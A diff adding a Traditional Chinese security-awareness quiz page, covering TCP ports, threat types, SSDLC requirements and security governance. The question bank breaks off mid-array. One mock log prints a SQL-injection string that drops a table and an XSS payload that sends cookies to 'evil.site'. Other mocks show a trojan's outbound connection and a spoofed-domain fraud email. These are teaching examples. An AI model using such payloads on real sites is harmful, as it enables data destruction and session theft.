@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>資安情境演練</title>
+<style>
+  /* ============ 設計變數 ============ */
+  :root {
+    --bg: #0F172A;
+    --bg-2: #111C33;
+    --card: #16213A;
+    --card-2: #1C2A47;
+    --line: #26375A;
+    --text: #E2E8F0;
+    --muted: #94A3B8;
+    --blue: #2563EB;
+    --blue-soft: rgba(37, 99, 235, .16);
+    --green: #10B981;
+    --green-soft: rgba(16, 185, 129, .14);
+    --red: #EF4444;
+    --red-soft: rgba(239, 68, 68, .14);
+    --amber: #F59E0B;
+    --amber-soft: rgba(245, 158, 11, .14);
+    --radius: 14px;
+    --shadow: 0 10px 30px rgba(0, 0, 0, .35), 0 1px 0 rgba(255, 255, 255, .03) inset;
+    --mono: ui-monospace, "Cascadia Code", Consolas, "Courier New", monospace;
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; }
+  body {
+    background:
+      radial-gradient(1200px 600px at 85% -10%, rgba(37, 99, 235, .18), transparent 60%),
+      radial-gradient(900px 500px at -10% 110%, rgba(16, 185, 129, .08), transparent 60%),
+      var(--bg);
+    background-attachment: fixed;
+    color: var(--text);
+    font-family: "Noto Sans TC", "Microsoft JhengHei", "PingFang TC", system-ui, sans-serif;
+    line-height: 1.7;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+  /* 背景網格，增加科技感 */
+  body::before {
+    content: "";
+    position: fixed; inset: 0;
+    background-image:
+      linear-gradient(rgba(148, 163, 184, .05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(148, 163, 184, .05) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrap { position: relative; z-index: 1; max-width: 860px; margin: 0 auto; padding: 0 16px 48px; }
+
+  /* ============ 頁首與進度 ============ */
+  header.top {
+    position: sticky; top: 0; z-index: 10;
+    background: rgba(15, 23, 42, .88);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--line);
+  }
+  .top-inner { max-width: 860px; margin: 0 auto; padding: 14px 16px 12px; }
+  .brand { display: flex; align-items: center; gap: 10px; }
+  .brand-icon {
+    width: 34px; height: 34px; border-radius: 9px; flex: none;
+    display: grid; place-items: center;
+    background: linear-gradient(135deg, var(--blue), #1D4ED8);
+    box-shadow: 0 0 18px rgba(37, 99, 235, .5);
+  }
+  .brand h1 { font-size: 1.05rem; margin: 0; letter-spacing: .04em; }
+  .brand small { display: block; color: var(--muted); font-size: .78rem; font-weight: 400; letter-spacing: .02em; }
+  .progress-row { display: flex; justify-content: space-between; align-items: baseline; margin-top: 10px; font-size: .85rem; color: var(--muted); }
+  .progress-row b { color: var(--text); font-size: 1rem; }
+  .progress-row .live-score { font-family: var(--mono); }
+  .bar { height: 6px; border-radius: 99px; background: var(--card-2); margin-top: 6px; overflow: hidden; }
+  .bar > span {
+    display: block; height: 100%; width: 0;
+    background: linear-gradient(90deg, var(--blue), #60A5FA);
+    box-shadow: 0 0 12px rgba(37, 99, 235, .7);
+    transition: width .45s ease;
+  }
+
+  /* ============ 題目卡片 ============ */
+  .card {
+    margin-top: 22px;
+    background: linear-gradient(180deg, var(--card), var(--bg-2));
+    border: 1px solid var(--line);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    padding: 24px;
+    animation: rise .35s ease;
+  }
+  @keyframes rise { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: none; } }
+
+  .chips { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 14px; }
+  .chip {
+    font-size: .76rem; padding: 3px 10px; border-radius: 99px;
+    border: 1px solid var(--line); color: var(--muted); background: rgba(15, 23, 42, .5);
+  }
+  .chip.topic { color: #93C5FD; border-color: rgba(37, 99, 235, .5); background: var(--blue-soft); }
+
+  .scene-label { font-size: .78rem; color: var(--muted); letter-spacing: .12em; margin: 0 0 4px; }
+  .scene { font-size: 1.08rem; margin: 0 0 16px; }
+
+  /* 模擬郵件 / 簡訊 / 檔案 / 系統日誌 區塊 */
+  .mock {
+    background: #0B1222;
+    border: 1px solid #334155;
+    border-left: 4px solid #64748B;
+    border-radius: 10px;
+    margin: 0 0 18px;
+    overflow: hidden;
+    font-size: .92rem;
+  }
+  .mock-head {
+    display: flex; align-items: center; gap: 8px;
+    padding: 8px 14px; background: #131C30; border-bottom: 1px solid #334155;
+    font-size: .75rem; color: var(--muted); letter-spacing: .08em;
+  }
+  .mock-head .dots { display: flex; gap: 5px; }
+  .mock-head .dots i { width: 9px; height: 9px; border-radius: 50%; background: #475569; display: block; }
+  .mock-body { padding: 12px 14px; }
+  .mock-meta { color: var(--muted); font-size: .85rem; border-bottom: 1px dashed #334155; padding-bottom: 8px; margin-bottom: 8px; }
+  .mock-meta div { word-break: break-all; }
+  .mock-meta b { color: #CBD5E1; font-weight: 500; }
+  .mock p { margin: 0 0 6px; }
+  .mock.log .mock-body, .mock.file .mock-body { font-family: var(--mono); font-size: .82rem; white-space: pre-wrap; word-break: break-all; color: #A7F3D0; }
+  .mock.sms { border-left-color: var(--green); }
+  .mock.email { border-left-color: var(--amber); }
+  .mock.log { border-left-color: var(--red); }
+  .mock.file { border-left-color: var(--red); }
+
+  .stem { font-weight: 700; font-size: 1.02rem; margin: 4px 0 12px; display: flex; gap: 8px; }
+  .stem::before { content: "Q"; color: var(--blue); font-family: var(--mono); }
+
+  /* 選項 */
+  .options { display: grid; gap: 10px; }
+  .opt {
+    display: flex; align-items: center; gap: 12px;
+    width: 100%; text-align: left;
+    padding: 13px 14px;
+    background: var(--card-2);
+    color: var(--text);
+    border: 1.5px solid var(--line);
+    border-radius: 11px;
+    font: inherit; font-size: .98rem;
+    cursor: pointer;
+    transition: transform .15s ease, border-color .15s ease, background .15s ease, box-shadow .15s ease;
+  }
+  .opt:hover:not(:disabled) { border-color: #3B5B92; transform: translateY(-1px); }
+  .opt:focus-visible { outline: 2px solid #60A5FA; outline-offset: 2px; }
+  .opt .key {
+    flex: none; width: 28px; height: 28px; border-radius: 8px;
+    display: grid; place-items: center;
+    background: rgba(15, 23, 42, .7); border: 1px solid var(--line);
+    font-family: var(--mono); font-size: .85rem; color: var(--muted);
+    transition: all .15s ease;
+  }
+  .opt .mark { margin-left: auto; font-weight: 700; font-size: .85rem; white-space: nowrap; }
+  .opt.selected {
+    border-color: var(--blue); background: var(--blue-soft);
+    box-shadow: 0 0 0 3px rgba(37, 99, 235, .18);
+    animation: pop .22s ease;
+  }
+  .opt.selected .key { background: var(--blue); border-color: var(--blue); color: #fff; }
+  @keyframes pop { 50% { transform: scale(1.015); } }
+  .opt:disabled { cursor: default; }
+  .opt.correct { border-color: var(--green); background: var(--green-soft); box-shadow: none; }
+  .opt.correct .key { background: var(--green); border-color: var(--green); color: #04130D; }
+  .opt.correct .mark { color: var(--green); }
+  .opt.wrong { border-color: var(--red); background: var(--red-soft); box-shadow: none; }
+  .opt.wrong .key { background: var(--red); border-color: var(--red); color: #fff; }
+  .opt.wrong .mark { color: var(--red); }
+  .opt.dim { opacity: .5; }
+
+  /* 按鈕 */
+  .actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 18px; }
+  .btn {
+    font: inherit; font-weight: 700; font-size: .95rem;
+    padding: 11px 22px; border-radius: 10px; border: 0; cursor: pointer;
+    background: var(--blue); color: #fff;
+    box-shadow: 0 6px 18px rgba(37, 99, 235, .35);
+    transition: transform .15s ease, filter .15s ease, opacity .15s ease;
+  }
+  .btn:hover:not(:disabled) { filter: brightness(1.1); transform: translateY(-1px); }
+  .btn:focus-visible { outline: 2px solid #93C5FD; outline-offset: 2px; }
+  .btn:disabled { opacity: .4; cursor: not-allowed; box-shadow: none; }
+  .btn.ghost { background: transparent; border: 1px solid var(--line); color: var(--text); box-shadow: none; }
+
+  /* ============ 回饋與專家解析 ============ */
+  .feedback { margin-top: 20px; animation: rise .35s ease; }
+  .verdict {
+    display: flex; align-items: center; gap: 12px;
+    padding: 14px 16px; border-radius: 11px; font-weight: 700;
+  }
+  .verdict .ico { font-size: 1.4rem; }
+  .verdict small { display: block; font-weight: 400; color: var(--muted); font-size: .86rem; }
+  .verdict.ok { background: var(--green-soft); border: 1px solid rgba(16, 185, 129, .45); color: #6EE7B7; }
+  .verdict.ng { background: var(--red-soft); border: 1px solid rgba(239, 68, 68, .45); color: #FCA5A5; }
+
+  .expert {
+    margin-top: 14px; padding: 18px;
+    border: 1px solid var(--line); border-radius: 11px;
+    background: rgba(15, 23, 42, .55);
+  }
+  .expert h3 { margin: 0 0 10px; font-size: .95rem; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  .expert h4 { margin: 16px 0 6px; font-size: .86rem; color: #93C5FD; letter-spacing: .06em; }
+  .expert p { margin: 0; color: #CBD5E1; }
+  .expert ul { margin: 0; padding-left: 1.2em; color: #CBD5E1; }
+  .expert li { margin: 3px 0; }
+  .expert li::marker { color: var(--green); }
+  .risk { font-size: .78rem; font-weight: 700; padding: 2px 10px; border-radius: 99px; }
+  .risk.high { color: #FCA5A5; background: var(--red-soft); border: 1px solid rgba(239, 68, 68, .5); }
+  .risk.mid  { color: #FCD34D; background: var(--amber-soft); border: 1px solid rgba(245, 158, 11, .5); }
+  .risk.low  { color: #6EE7B7; background: var(--green-soft); border: 1px solid rgba(16, 185, 129, .5); }
+  .kw { display: flex; flex-wrap: wrap; gap: 6px; }
+  .kw span { font-size: .76rem; padding: 2px 8px; border-radius: 6px; background: var(--card-2); color: var(--muted); border: 1px solid var(--line); }
+  .ref { margin-top: 14px; font-size: .8rem; color: var(--muted); }
+
+  /* ============ 結算儀表板 ============ */
+  .hidden { display: none !important; }
+  .dash-hero { text-align: center; }
+  .gauge { width: 190px; height: 190px; margin: 6px auto 8px; position: relative; }
+  .gauge svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+  .gauge .num { position: absolute; inset: 0; display: grid; place-items: center; text-align: center; }
+  .gauge .num b { font-size: 2.8rem; line-height: 1; font-family: var(--mono); }
+  .gauge .num small { display: block; color: var(--muted); font-size: .8rem; margin-top: 4px; }
+  .grade { display: inline-block; margin: 8px 0 4px; padding: 10px 18px; border-radius: 12px; font-weight: 700; font-size: 1.05rem; }
+  .grade.good { background: var(--green-soft); color: #6EE7B7; border: 1px solid rgba(16, 185, 129, .5); }
+  .grade.warn { background: var(--amber-soft); color: #FCD34D; border: 1px solid rgba(245, 158, 11, .5); }
+  .grade.bad  { background: var(--red-soft); color: #FCA5A5; border: 1px solid rgba(239, 68, 68, .5); }
+  .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
+  .stat { background: var(--card-2); border: 1px solid var(--line); border-radius: 11px; padding: 14px; text-align: center; }
+  .stat b { display: block; font-size: 1.7rem; font-family: var(--mono); line-height: 1.2; }
+  .stat span { font-size: .8rem; color: var(--muted); }
+  .stat.ok b { color: var(--green); }
+  .stat.ng b { color: var(--red); }
+  .section-title { font-size: .9rem; color: #93C5FD; letter-spacing: .08em; margin: 26px 0 10px; }
+  .topic-row { display: grid; grid-template-columns: minmax(0, 1fr) 70px; gap: 4px 12px; align-items: center; margin-bottom: 12px; font-size: .9rem; }
+  .topic-row .t-bar { grid-column: 1 / -1; height: 8px; border-radius: 99px; background: var(--card-2); overflow: hidden; }
+  .topic-row .t-bar span { display: block; height: 100%; border-radius: 99px; transition: width .6s ease; }
+  .topic-row .t-val { text-align: right; font-family: var(--mono); color: var(--muted); font-size: .85rem; }
+  .review { list-style: none; margin: 0; padding: 0; display: grid; gap: 8px; }
+  .review li { background: var(--card-2); border: 1px solid var(--line); border-left: 3px solid var(--red); border-radius: 9px; padding: 10px 12px; font-size: .88rem; }
+  .review li b { color: #FCA5A5; font-family: var(--mono); margin-right: 6px; }
+  .review li .ans { display: block; color: var(--muted); font-size: .82rem; margin-top: 2px; }
+  .review li .ans em { color: #6EE7B7; font-style: normal; }
+
+  /* ============ 響應式 ============ */
+  @media (max-width: 600px) {
+    .card { padding: 18px 16px; margin-top: 16px; }
+    .scene { font-size: 1rem; }
+    .actions { flex-direction: column-reverse; }
+    .btn { width: 100%; }
+    .stats { gap: 8px; }
+    .stat { padding: 10px 6px; }
+    .stat b { font-size: 1.4rem; }
+    .gauge { width: 160px; height: 160px; }
+    .brand small { display: none; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation: none !important; transition: none !important; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ============ 頁首：標題 + 進度條 ============ -->
+<header class="top">
+  <div class="top-inner">
+    <div class="brand">
+      <div class="brand-icon" aria-hidden="true">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+      </div>
+      <h1>資安情境演練<small>Port 識別・資安威脅・SSDLC・資安管控模式</small></h1>
+    </div>
+    <div class="progress-row">
+      <span id="progressText">第 <b>1</b> 題 / 共 <b>27</b> 題</span>
+      <span class="live-score" id="liveScore">✔ 0　✘ 0</span>
+    </div>
+    <div class="bar" role="progressbar" aria-label="作答進度" aria-valuemin="0" aria-valuemax="100" id="progressBar"><span id="progressFill"></span></div>
+  </div>
+</header>
+
+<main class="wrap">
+  <!-- 題目區 -->
+  <section id="quiz" aria-live="polite"></section>
+  <!-- 結算區 -->
+  <section id="dashboard" class="hidden"></section>
+</main>
+
+<script>
+/* =========================================================
+ * 題庫資料（依「資安情境演練對應總表」整理）
+ * g: 主題群組，label: 正確答案選項文字，risk: 高/中/低
+ * mock: 情境中的模擬郵件/簡訊/檔案/日誌（選填）
+ * 干擾選項自動取自同一主題群組的其他項目
+ * ========================================================= */
+const GROUPS = {
+  1: { name: "TCP Port No. 識別", stem: "依情境判斷，此處使用的服務協定與預設 TCP Port 為何？" },
+  2: { name: "資安威脅",          stem: "此情境屬於哪一種資安威脅類型？" },
+  3: { name: "系統安全開發 (SSDLC)", stem: "在系統安全開發（SSDLC）中，此需求對應哪一項安全要求？" },
+  4: { name: "資安管控模式",       stem: "此作為屬於資安管控模式中的哪一個層面與項目？" }
+};
+
+const QUESTIONS = [
+  /* ---------- 1. TCP Port No. 識別 ---------- */
+  { g: 1, id: "1-1", label: "FTP（File Transfer Protocol）— Port 21", risk: "中",
+    scene: "貨車司機完成送貨後，透過物流公司網頁傳送電子檔與貨單資料。",
+    why: "「傳送電子檔／貨單」屬於用戶端與伺服器間的檔案上傳下載，對應 FTP（TCP 21，控制通道）。FTP 以明文傳送帳號、密碼與檔案內容，同網段的攻擊者可直接側錄，貨單中的客戶地址、電話等個資也一併外露。",
+    tips: ["改用 SFTP（Port 22）或 FTPS（Port 990）加密傳輸", "停用匿名登入，限制可連線的來源 IP", "上傳目錄禁止執行權限，並對上傳檔案做防毒掃描"],
+    kw: ["FTP", "Port 21", "檔案傳輸協定", "明文傳輸", "檔案上傳下載"], page: "網路基礎概論 第43頁" },
+
+  { g: 1, id: "1-2", label: "HTTP（Hypertext Transfer Protocol）— Port 80", risk: "高",
+    scene: "物流公司現有網站未具備安全加密，所有資料以明文方式傳輸。",
+    why: "未加密的標準網頁服務即為 HTTP（TCP 80）。登入帳密、訂單與個資在傳輸途中可被竊聽，也可能遭中間人（MITM）竄改頁面內容、植入惡意連結。",
+    tips: ["全站導入 HTTPS，並將 Port 80 請求強制轉址至 443", "啟用 HSTS，避免被降級回明文連線", "改版完成前，登入與表單頁面不得以 HTTP 提供"],
+    kw: ["HTTP", "Port 80", "明文傳輸", "未加密網頁", "Web服務"], page: "網路基礎概論 第43頁" },
+
+  { g: 1, id: "1-3", label: "HTTPS（HTTP Secure）— Port 443", risk: "低",
+    scene: "網站安全性即將提升，預計一週後採用 SSL/TLS 進行加密傳輸。",
+    why: "透過 SSL/TLS 加密的網頁服務為 HTTPS（TCP 443），可確保傳輸機密性與完整性。目標架構風險低，但請注意：在這一週過渡期內網站仍是明文，風險尚未消除。",
+    tips: ["使用 TLS 1.2 以上版本，停用 SSLv3 / TLS 1.0 / 1.1", "設定憑證自動續期，避免憑證過期造成服務中斷", "過渡期間暫停或限制敏感功能（如線上付款）"],
+    kw: ["HTTPS", "Port 443", "SSL/TLS", "加密傳輸", "安全網頁"], page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-4", label: "POP3（Post Office Protocol v3）— Port 110", risk: "中",
+    scene: "員工習慣傳統收信方式，將郵件全部下載到個人電腦（PC）上。",
+    why: "將郵件下載到本機、且預設自伺服器端刪除，是 POP3（TCP 110）的特徵。110 為明文協定，帳密可能外洩；郵件集中於單一電腦，一旦電腦遺失、中毒或硬碟損壞，郵件即外洩或永久遺失。",
+    tips: ["改用 POP3S（Port 995）加密連線", "個人電腦啟用磁碟加密並定期備份郵件", "評估改用 IMAP / 雲端信箱集中管理"],
+    kw: ["POP3", "Port 110", "郵局協定", "郵件下載", "伺服器端刪除"], page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-5", label: "IMAP（Internet Message Access Protocol）— Port 143", risk: "中",
+    scene: "員工同時使用手機、平板等多種裝置，需要即時同步看到相同的最新信件。",
+    why: "郵件保留在伺服器上、支援多裝置同步，是 IMAP（TCP 143）的特徵。裝置越多，帳號被盜用或裝置遺失導致郵件外洩的機會就越高；143 若未加密也會外洩帳密。",
+    tips: ["改用 IMAPS（Port 993）加密連線", "信箱帳號啟用多因子驗證（MFA）", "行動裝置設定螢幕鎖與遠端抹除（MDM）"],
+    kw: ["IMAP", "Port 143", "訊息存取協定", "多裝置同步", "伺服器保留"], page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-6", label: "MS SQL Server 資料庫服務 — Port 1433", risk: "高",
+    scene: "後台工程師使用管理程式，連線至 Microsoft SQL Server 資料庫進行維護。",
+    why: "Microsoft SQL Server 資料庫引擎預設接聽 TCP 1433。若 1433 直接暴露於網際網路，常成為暴力破解 sa 帳號、SQL 注入後橫向移動與勒索軟體入侵的入口，一旦得手即是整個資料庫外洩。",
+    tips: ["1433 不對外開放，僅允許經 VPN 或跳板機連線", "停用或更名 sa 帳號，採最小權限的專用帳號", "強制加密連線並開啟登入稽核"],
+    kw: ["MS SQL Server", "Port 1433", "資料庫引擎", "後台管理", "資料查詢"], page: "網路基礎概論 第44頁" },
+
+  { g: 1, id: "1-7", label: "RDP（Remote Desktop Protocol）— Port 3389", risk: "高",
+    scene: "工程師在自家電腦透過遠端連線，直接觀看並操作公司微軟主機的桌面圖形介面。",
+    why: "Windows 內建的圖形化遠端桌面服務為 RDP（TCP 3389）。3389 是全球最常被掃描與暴力破解的連接埠之一，也是勒索軟體最常見的初始入侵管道。",
+    tips: ["不直接對外開放 3389，改經 VPN 或 RD Gateway", "啟用網路層級驗證（NLA）與多因子驗證", "設定帳號鎖定原則並監控異常登入"],
+    kw: ["RDP", "Port 3389", "遠端桌面協定", "圖形化介面", "微軟Windows"], page: "網路基礎概論 第44頁" },
+
+  /* ---------- 2. 資安威脅 ---------- */
+  { g: 2, id: "2-1", label: "木馬（Trojan）／惡意軟體下載", risk: "高",
+    scene: "美玲為了圖方便，下載了網路上的「免費破解包」。執行後，電腦在背景自動建立外部連線，並私下發送封包。",
+    mock: { type: "file", title: "下載的檔案",
+      text: "📦 Office_2026_Pro_Crack_免安裝.zip\n  ├─ Setup_Crack.exe      (簽章：無)\n  └─ 必讀.txt\n\n必讀.txt：\n「安裝前請先關閉防毒軟體，否則破解會失敗！」\n\n[背景連線] Setup_Crack.exe → 185.xx.xx.17:4444  ESTABLISHED" },
+    why: "偽裝成實用軟體、執行後暗中建立後門外聯，是典型的木馬程式。「要求先關閉防毒」是最明顯的警訊。攻擊者可藉此遠端控制電腦、竊取帳密，並以此為跳板入侵公司內網。",
+    tips: ["禁止下載與安裝未授權的盜版軟體", "端點安裝 EDR／防毒軟體，且不得任意關閉", "監控網路封包，阻斷對未知 IP 的異常外聯"],
+    kw: ["木馬", "病毒", "惡意軟體", "破解包", "後門連線", "軟體漏洞"], page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-2", label: "電子郵件社交工程／網路釣魚（Phishing）", risk: "高",
+    scene: "會計小張收到一封看似越南布料供應商寄來的急件 Email，未打電話確認，就核准匯款 300 萬元。",
+    mock: { type: "email", title: "收件匣",
+      from: "Viet Textile Co., Ltd &lt;sales@viet-textiIe.com&gt;",
+      to: "小張（會計部）",
+      subject: "【急件】匯款帳戶變更通知 — 請今日完成付款",
+      body: ["張先生您好：", "因本公司銀行帳戶年度稽核，本期布料貨款 <b>NT$3,000,000</b> 請改匯至下列新帳戶，並於<b>今日下午 3 點前</b>完成，以免影響出貨。", "新帳戶：XX 國際銀行 012-8866-XXXX", "負責人目前出國中，<b>請勿來電</b>，有問題請直接回信。謝謝！"] },
+    why: "偽造寄件者（網域 viet-texti<b>I</b>e 以大寫 I 冒充小寫 l）、製造急迫感、變更匯款帳戶、刻意阻止電話確認 — 這是典型的商業電子郵件詐騙（BEC），屬電子郵件社交工程。",
+    tips: ["匯款帳戶變更一律以「既有電話」雙重確認，不使用信中聯絡方式", "郵件伺服器啟用 SPF／DKIM／DMARC 驗證，外部郵件加註標籤", "定期實施社交工程演練與宣導"],
+    kw: ["電子郵件社交工程", "網路釣魚", "偽造寄件者", "詐騙匯款", "社交工程演練"], page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-3", label: "零時差攻擊／程式漏洞攻擊", risk: "高",
+    scene: "駭客利用尚未被發現的系統盲點與程式漏洞，在無預警的情況下繞過防護，竊取大量核心敏感資料。",
+    why: "利用廠商尚未發現或尚未修補的漏洞發動攻擊，即零時差（Zero-day）攻擊。因為沒有現成的修補程式與特徵碼，傳統防毒難以偵測，只能靠多層防禦降低衝擊。",
+    tips: ["落實修補程式管理（Patching），漏洞公布後儘速更新", "採縱深防禦與零信任架構，避免單點突破即全面淪陷", "部署入侵偵測系統（IDS）監控異常行為"],
+    kw: ["零時差攻擊", "程式漏洞攻擊", "未知威脅", "資料外洩", "系統滲透"], page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-4", label: "分散式阻斷攻擊（DDoS）", risk: "高",
+    scene: "外部大量異常垃圾流量瞬間湧入系統，前台網站回應越來越慢，最終崩潰斷線。",
+    mock: { type: "log", title: "網站監控告警",
+      text: "[14:02:11] WARN  inbound traffic 1.2 Gbps  (baseline 40 Mbps)\n[14:02:13] WARN  unique source IPs: 48,392 (多國來源)\n[14:02:20] CRIT  HTTP 503 Service Unavailable ratio 87%\n[14:02:31] CRIT  web-01 / web-02 health check FAILED" },
+    why: "來自大量分散來源的異常流量耗盡頻寬或伺服器資源，導致合法使用者無法使用服務，即分散式阻斷服務（DDoS）攻擊，直接衝擊營運可用性。",
+    tips: ["導入 DDoS 流量清洗服務或 CDN（如 Cloudflare）", "設定頻寬與請求速率限制（Rate Limiting）", "異常 IP 自動封鎖，並預先規劃應變流程"],
+    kw: ["分散式阻斷攻擊", "DDoS", "流量攻擊", "網站癱瘓", "服務中斷"], page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-5", label: "供應鏈攻擊（Supply Chain Attack）", risk: "高",
+    scene: "外部廠商／供應商的連線端存在安全漏洞，遭駭客濫用後，進一步滲透到企業內部核心系統。",
+    why: "攻擊者不直接攻擊目標，而是先攻破防護較弱、但受目標信任的第三方廠商，再沿著信任關係滲透進來，即供應鏈攻擊。",
+    tips: ["落實第三方廠商資安風險評估與合約要求", "廠商帳號採最小權限存取控制（RBAC），用完即關", "所有廠商連線集中管控並留存稽核紀錄"],
+    kw: ["供應鏈攻擊", "第三方風險", "廠商權限控管", "信任鏈滲透"], page: "資安核心概念 第9頁" },
+
+  /* ---------- 3. 系統安全開發 (SSDLC) ---------- */
+  { g: 3, id: "3-1", label: "Access Control（存取控制）", risk: "中",
+    scene: "「看人用菜單」— 每個人登入後只能看到自己該看的東西，例如廠商與司機只能看到訂單資料。",
+    why: "依使用者角色決定能存取哪些功能與資料，即存取控制。若缺乏此設計，司機帳號一旦被盜，攻擊者就能看到全公司的財務與客戶資料。",
+    tips: ["實施角色型存取控制（RBAC）", "遵循最小權限原則，預設拒絕、按需開放", "伺服器端做資料列級／欄位級權限過濾，不只隱藏前端按鈕"],
+    kw: ["Access Control", "存取控制", "角色權限 (RBAC)", "最小權限原則"], page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-2", label: "Authenticity（身分驗證／可信度）", risk: "高",
+    scene: "除了基本密碼之外，系統必須強制綁定手機、輸入動態密碼，才能真正登入。",
+    why: "確認「登入者真的是本人」屬於身分驗證（Authenticity）。僅靠密碼容易因撞庫、釣魚或弱密碼被盜用，加上動態密碼即構成多因子驗證。",
+    tips: ["導入多因子驗證（MFA／TOTP）", "搭配登入失敗鎖定與異常登入通知", "優先採用驗證器 App 或實體金鑰，降低簡訊攔截風險"],
+    kw: ["Authenticity", "雙重驗證 (2FA/MFA)", "動態密碼 (OTP)", "身分確認"], page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-3", label: "Communication Security & Confidentiality（通訊安全與機密性）", risk: "高",
+    scene: "外派業務在機場、咖啡廳等公共 Wi-Fi 處理訂單，資料在傳輸過程中絕不能被偷看或亂改。",
+    why: "保護資料「在傳輸中」不被竊聽、不被竄改，屬通訊安全與機密性。公共 Wi-Fi 極易遭側錄或架設假熱點（Evil Twin）進行中間人攻擊。",
+    tips: ["全站強制端對端 HTTPS（TLS 1.3），禁止明文傳輸", "外出處理公務一律透過公司 VPN", "教育員工避免連線不明的免費 Wi-Fi"],
+    kw: ["Communication Security", "傳輸加密", "SSL/TLS", "防竊聽", "防竄改"], page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-4", label: "Information Confidentiality & Encryption（資訊機密與加密）", risk: "高",
+    scene: "系統儲存客戶信用卡號與敏感個人資料，即使主機遭竊，也必須確保資料不外洩。",
+    why: "保護資料「在儲存時」的機密性，屬資訊機密與加密（靜態加密）。即使硬碟或資料庫檔案被整份帶走，沒有金鑰也無法讀取內容。",
+    tips: ["採用 AES-256 靜態資料加密（Encryption at Rest）", "金鑰與資料分開保管（KMS／HSM）", "非必要不儲存卡號，必要時做遮罩或去識別化"],
+    kw: ["Information Confidentiality", "Encryption", "敏感資料保護", "靜態加密"], page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-5", label: "Against Attack（防範攻擊／輸入防護）", risk: "高",
+    scene: "防範駭客在網頁搜尋欄、留言板輸入奇怪符號或電腦指令，並能自動擋掉垃圾流量。",
+    mock: { type: "log", title: "搜尋欄收到的輸入",
+      text: "q = ' OR 1=1; DROP TABLE orders; --\nq = &lt;script&gt;fetch('//evil.site/?c='+document.cookie)&lt;\/script&gt;" },
+    why: "在輸入欄位注入 SQL 語法或腳本，即 SQL Injection 與 XSS 攻擊，屬「防範攻擊」要求。未過濾的輸入可能導致資料庫被刪改、使用者 Cookie 被盜。",
+    tips: ["所有輸入做伺服器端驗證（Input Validation）與輸出編碼", "資料庫查詢一律使用參數化查詢", "部署 WAF 自動阻擋惡意請求與垃圾流量"],
+    kw: ["Against Attack", "輸入驗證", "防SQL注入", "防XSS", "自動防禦"], page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-6", label: "Audit Trail & Non-repudiation & Accountability（稽核軌跡與不可否認性）", risk: "中",
+    scene: "內部員工修改系統金額等關鍵紀錄時，系統必須留下不可塗改、不可刪除的紀錄作為鐵證。",
+    why: "記錄「誰、何時、改了什麼」且事後無法否認，屬稽核軌跡、不可否認性與可歸責性。可嚇阻內部舞弊，並在事件發生後提供調查證據。",
+    tips: ["建立不可竄改的稽核日誌（WORM 儲存或區塊鏈）", "日誌集中保存於獨立主機，一般管理者無刪除權限", "關鍵金額異動需雙人覆核並記錄簽核者"],
+    kw: ["Audit Trail", "Non-repudiation", "Accountability", "稽核軌跡", "不可否認性"], page: "資安核心概念 第16頁" },
+
+  /* ---------- 4. 資安管控模式 ---------- */
+  { g: 4, id: "4-1", label: "策略面 — 資安管理組織架構", risk: "中",
+    scene: "總召集人麗麗統籌全局，成立指揮中心，負責決策與整體風險控制。",
+    why: "由高層成立指揮中心、統籌決策與資源，屬「策略面」的資安管理組織架構。沒有明確的權責組織，資安事件發生時容易多頭馬車、延誤處置。",
+    tips: ["成立資安專責應變小組，明定權責分工", "建立跨部門指揮與決策架構", "定期向高層報告資安風險狀況"],
+    kw: ["策略面", "資安管理組織架構", "指揮中心", "決策與資源分配"], page: "資安核心概念 第11頁" },
+
+  { g: 4, id: "4-2", label: "策略面 — 業務核心目標", risk: "中",
+    scene: "決策將大部分預算投入租用高安全性的雲端伺服器，優先保障系統核心安全。",
+    why: "依業務核心目標決定資源與預算的優先順序，屬「策略面」的業務核心目標。資源有限時，應優先保護對營運衝擊最大的核心資產。",
+    tips: ["以資安風險為導向分配預算", "盤點核心資產並排定保護優先順序", "上雲仍需落實共同責任模型下自身的設定與管理"],
+    kw: ["策略面", "業務核心目標", "資源合理配置", "雲端伺服器安全"], page: "資安核心概念 第11頁" },
+
+  { g: 4, id: "4-3", label: "策略面 — 事件處理及營運持續", risk: "高",
+    scene: "制定「危機應變計畫」，確保支付功能遭癱瘓時，能迅速切換至備份系統並調用備援。",
+    why: "預先規劃事件發生時如何維持關鍵業務運作，屬「策略面」的事件處理及營運持續（BCM）。沒有演練過的計畫，事發時往往無法執行。",
+    tips: ["建立業務持續運作計畫（BCM）與災難復原（DR）機制", "訂定應變 SOP，並定期實際演練切換", "備份採 3-2-1 原則並驗證可還原"],
